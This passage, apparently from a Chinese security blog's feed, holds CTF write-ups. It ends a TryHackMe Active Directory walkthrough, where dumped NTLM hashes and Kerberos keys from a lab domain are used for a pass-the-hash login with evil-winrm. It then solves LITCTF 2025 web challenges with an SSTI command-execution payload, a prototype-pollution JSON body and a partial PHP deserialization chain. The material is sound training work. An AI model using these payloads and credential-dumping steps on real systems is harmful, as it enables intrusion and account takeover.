Error: code: 0x5 - rpc_s_access_denied <br>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)<br>[*] Using the DRSUAPI method to get NTDS.DIT secrets<br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::<br>spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::<br>spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::<br>spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::<br>spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::<br>spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::<br>spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::<br>spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::<br>spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::<br>spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::<br>spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::<br>spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::<br>spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::<br>spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::<br>spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::<br><span class="hljs-meta prompt_">ATTACKTIVEDIREC$</span><span class="language-bash">:1000:aad3b435b51404eeaad3b435b51404ee:17960b8793202667f0c3d990b754297f:::</span><br>[*] Kerberos keys grabbed<br>Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48<br>Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae<br>Administrator:des-cbc-md5:2079ce0e5df189ad<br>krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc<br>krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902<br>krbtgt:des-cbc-md5:b94f97e97fabbf5d<br>spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04<br>spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233<br>spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f<br>spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5<br>spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425<br>spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064<br>spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112<br>spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6<br>spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9<br>spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe<br>spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510<br>spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054<br>spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd<br>spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e<br>spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594<br>spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499<br>spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be<br>spookysec.local\darkstar:des-cbc-md5:758af4d061381cea<br>spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067<br>spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e<br>spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a<br>spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3<br>spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8<br>spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64<br>spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0<br>spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8<br>spookysec.local\paradox:des-cbc-md5:83988983f8b34019<br>spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347<br>spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa<br>spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86<br>spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166<br>spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c<br>spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157<br>spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518<br>spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff<br>spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d<br>spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922<br>spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197<br>spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89<br>spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242<br>spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68<br>spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9<br><span class="hljs-meta prompt_">ATTACKTIVEDIREC$</span><span class="language-bash">:aes256-cts-hmac-sha1-96:868008ebcd155cdfdb430fbb2558a4d6879baf00e3f63682acd3c170dac61171</span><br><span class="hljs-meta prompt_">ATTACKTIVEDIREC$</span><span class="language-bash">:aes128-cts-hmac-sha1-96:2a3f24b7c074c7b9892e9f228fba9bc5</span><br><span class="hljs-meta prompt_">ATTACKTIVEDIREC$</span><span class="language-bash">:des-cbc-md5:4a2c315e9419b34f</span><br>[*] Cleaning up... <br></code></pre></td></tr></table></figure><p>获取hash，登录<code>winrm</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿vbox)-[/tmp]<br>└─# evil-winrm -i $ip -u Administrator -H 0e0363213e37b94221497260b0bcb4fc<br>                                        <br>Evil-WinRM shell v3.7<br>                                        <br>Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline<br>                                        <br>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion<br>                                        <br>Info: Establishing connection to remote endpoint<br>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; type ../Desktop/root.txt<br>TryHackMe&#123;4ctiveD1rectoryM4st3r&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>域</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>域</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LITCTF 2025</title>
    <link href="/2025/05/30/LITCTF-2025/"/>
    <url>/2025/05/30/LITCTF-2025/</url>
    
    <content type="html"><![CDATA[<h1 id="easy-file"><a href="#easy-file" class="headerlink" title="easy_file"></a>easy_file</h1><p><img src="/img/LITCTF-2025/image-20250530133906284.png"></p><p>弱口令进入</p><p><img src="/img/LITCTF-2025/image-20250530133926108.png"></p><p>文件上传，这里过滤了<code>ph</code>字符，但是在主页面中发现传参</p><p><img src="/img/LITCTF-2025/image-20250530134201277.png"></p><p>file能够查看头像。我们尝试上传一个<code>jpg</code></p><p><img src="/img/LITCTF-2025/image-20250530134242633.png"></p><p>过滤了<code>&lt;?php</code></p><p><img src="/img/LITCTF-2025/image-20250530134257367.png"></p><p>成功上传，尝试包含。</p><p><img src="/img/LITCTF-2025/image-20250530134418723.png"></p><p><img src="/img/LITCTF-2025/image-20250530134446992.png"></p><h1 id="nest-js"><a href="#nest-js" class="headerlink" title="nest_js"></a>nest_js</h1><p><img src="/img/LITCTF-2025/image-20250530134515071.png"></p><p>还是弱口令</p><p><img src="/img/LITCTF-2025/image-20250530134525725.png"></p><h1 id="星愿信箱"><a href="#星愿信箱" class="headerlink" title="星愿信箱"></a>星愿信箱</h1><p>是ssti，过滤了 <code>&#123;&#123;&#125;&#125;</code></p><p><img src="/img/LITCTF-2025/image-20250530134804708.png"></p><p><code>&#123;%print(lipsum.__globals__.__builtins__['__import__']('os').popen('tac /flag ').read())%&#125;</code></p><h1 id="多重宇宙日记"><a href="#多重宇宙日记" class="headerlink" title="多重宇宙日记"></a>多重宇宙日记</h1><p>原型链污染</p><p><img src="/img/LITCTF-2025/image-20250530134834588.png"></p><p>随意注册一下</p><p>在这里发送json数据会进行更新</p><p><img src="/img/LITCTF-2025/image-20250530134855929.png"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 更新表单的JS提交</span><br>        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;profileUpdateForm&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;submit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) &#123;<br>            event.<span class="hljs-title function_">preventDefault</span>();<br>            <span class="hljs-keyword">const</span> statusEl = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;updateStatus&#x27;</span>);<br>            <span class="hljs-keyword">const</span> currentSettingsEl = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;currentSettings&#x27;</span>);<br>            statusEl.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;正在更新...&#x27;</span>;<br><br>            <span class="hljs-keyword">const</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>(event.<span class="hljs-property">target</span>);<br>            <span class="hljs-keyword">const</span> settingsPayload = &#123;&#125;;<br>            <span class="hljs-comment">// 构建 settings 对象，只包含有值的字段</span><br>            <span class="hljs-keyword">if</span> (formData.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;theme&#x27;</span>)) settingsPayload.<span class="hljs-property">theme</span> = formData.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;theme&#x27;</span>);<br>            <span class="hljs-keyword">if</span> (formData.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;language&#x27;</span>)) settingsPayload.<span class="hljs-property">language</span> = formData.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;language&#x27;</span>);<br>            <span class="hljs-comment">// ...可以添加其他字段</span><br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/profile/update&#x27;</span>, &#123;<br>                    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                    <span class="hljs-attr">headers</span>: &#123;<br>                        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>                    &#125;,<br>                    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">settings</span>: settingsPayload &#125;) <span class="hljs-comment">// 包装在 &quot;settings&quot;键下</span><br>                &#125;);<br>                <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>                <span class="hljs-keyword">if</span> (response.<span class="hljs-property">ok</span>) &#123;<br>                    statusEl.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;成功: &#x27;</span> + result.<span class="hljs-property">message</span>;<br>                    currentSettingsEl.<span class="hljs-property">textContent</span> = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(result.<span class="hljs-property">settings</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">2</span>);<br>                    <span class="hljs-comment">// 刷新页面以更新导航栏（如果isAdmin状态改变）</span><br>                    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-title function_">reload</span>(), <span class="hljs-number">1000</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    statusEl.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;错误: &#x27;</span> + result.<span class="hljs-property">message</span>;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                statusEl.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;请求失败: &#x27;</span> + error.<span class="hljs-title function_">toString</span>();<br>            &#125;<br>        &#125;);<br><br>        <span class="hljs-comment">// 发送原始JSON的函数</span><br>        <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">sendRawJson</span>(<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-keyword">const</span> rawJson = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;rawJsonSettings&#x27;</span>).<span class="hljs-property">value</span>;<br>            <span class="hljs-keyword">const</span> statusEl = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;rawJsonStatus&#x27;</span>);<br>            <span class="hljs-keyword">const</span> currentSettingsEl = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;currentSettings&#x27;</span>);<br>            statusEl.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;正在发送...&#x27;</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">const</span> parsedJson = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(rawJson); <span class="hljs-comment">// 确保是合法的JSON</span><br>                <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/profile/update&#x27;</span>, &#123;<br>                    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                    <span class="hljs-attr">headers</span>: &#123;<br>                        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>                    &#125;,<br>                    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(parsedJson) <span class="hljs-comment">// 直接发送用户输入的JSON</span><br>                &#125;);<br>                <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>                <span class="hljs-keyword">if</span> (response.<span class="hljs-property">ok</span>) &#123;<br>                    statusEl.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;成功: &#x27;</span> + result.<span class="hljs-property">message</span>;<br>                    currentSettingsEl.<span class="hljs-property">textContent</span> = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(result.<span class="hljs-property">settings</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">2</span>);<br>                     <span class="hljs-comment">// 刷新页面以更新导航栏（如果isAdmin状态改变）</span><br>                    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-title function_">reload</span>(), <span class="hljs-number">1000</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    statusEl.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;错误: &#x27;</span> + result.<span class="hljs-property">message</span>;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                 statusEl.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;请求失败或JSON无效: &#x27;</span> + error.<span class="hljs-title function_">toString</span>();<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p>通过前端js源码发现，在<code>settings</code>下设置原型中的<code>isAdmin</code> 为 <code>true即可</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;isAdmin&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/LITCTF-2025/image-20250530135052211.png"></p><p>发送之后，导航栏会出现一个新的选项。</p><p><img src="/img/LITCTF-2025/image-20250530135104445.png"></p><p><img src="/img/LITCTF-2025/image-20250530135108565.png"></p><p>得到flag。</p><h1 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h1><p>进入页面是403，进行目录扫描 </p><p><img src="/img/LITCTF-2025/image-20250530135637897.png"></p><p>有一个<code>login.php</code></p><p><img src="/img/LITCTF-2025/image-20250530135653673.png"></p><p>说参数不完整.</p><p>访问<code>login.html</code></p><p><img src="/img/LITCTF-2025/image-20250530135758414.png"></p><p>这里有一个<code>api.js</code></p><p><img src="/img/LITCTF-2025/image-20250530135810520.png"></p><p><img src="/img/LITCTF-2025/image-20250530135927278.png"></p><p>可以包含。读当前文件<code>file:///var/www/html/api/sys/urlcode.php</code></p><p><img src="/img/LITCTF-2025/image-20250530140054821.png"></p><p>有一个php文件，尝试访问</p><p><img src="/img/LITCTF-2025/image-20250530140122237.png"></p><p>直接访问即可。</p><h1 id="君の名は"><a href="#君の名は" class="headerlink" title="君の名は"></a>君の名は</h1><blockquote><p>考察点为：简单php魔术方法</p><p>匿名函数如果没有设置返回值，可以通过调用生成的函数名执行其中的代码。匿名函数名会被设置为<code>\00lambda_%d</code> ，其中%d是递增的，但存在最大长度，如果达到最大长度那么会刷新为1.</p><p>反射方法调用匿名函数：ReflectionFuntion::invoke() </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&#x27;die(`/readflag`);&#x27;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Taki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$musubi</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$magic</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;musubi = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;musubi&#x27;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;magic = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;magic&#x27;</span>];<br>        <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;musubi)();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        (<span class="hljs-keyword">new</span> <span class="hljs-variable">$args</span>[<span class="hljs-number">0</span>](<span class="hljs-variable">$args</span>[<span class="hljs-number">1</span>]))-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;magic&#125;();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mitsuha</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$memory</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$thread</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;memory.<span class="hljs-variable language_">$this</span>-&gt;thread;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KatawareDoki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$soul</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$kuchikamizake</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;soul)-&gt;<span class="hljs-title function_ invoke__">flag</span>(<span class="hljs-variable">$this</span>-&gt;kuchikamizake,<span class="hljs-variable">$this</span>-&gt;name);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;call error!no flag!&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$Litctf2025</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Litctf2025&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="hljs-variable">$Litctf2025</span>))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$Litctf2025</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;把O改成C不就行了吗,笨蛋!～(∠・ω&lt; )⌒☆&quot;</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>首先第一个正则检测O开头，这里可以使用<code>C</code>绕过，其次由于此题目php版本较高，所以对属性修饰符不敏感，可以把<code>private</code>修改为<code>public</code></p><p>那么先来分析链子。</p><p>首先当我们传入参数后会执行<code>unserialize函数</code>，那么会调用<code>Taki::__unserialize</code>，在这个函数中可以利用<code>($this-&gt;musubi)();</code>，将musubi设置为<code>Mitsuha</code>,就会调用<code>Mitsuha::invoke</code>，然后由于<code>$this-&gt;memory.$this-&gt;thread;</code>进行字符串拼接，此时让<code>thread</code>为 <code>new KatawareDoki()</code> 即可调用到 <code>KatawareDoki::__toString</code>。然后通过此函数中不存在的函数<code>flag</code> 调用到 <code>Taki::__call</code>，new 一个<code>ReflectionFunction</code>函数进行调用到匿名函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Taki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$musubi</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$magic</span> = <span class="hljs-string">&quot;invoke&quot;</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mitsuha</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$memory</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$thread</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KatawareDoki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$soul</span>;<br>    <span class="hljs-keyword">public</span> <span 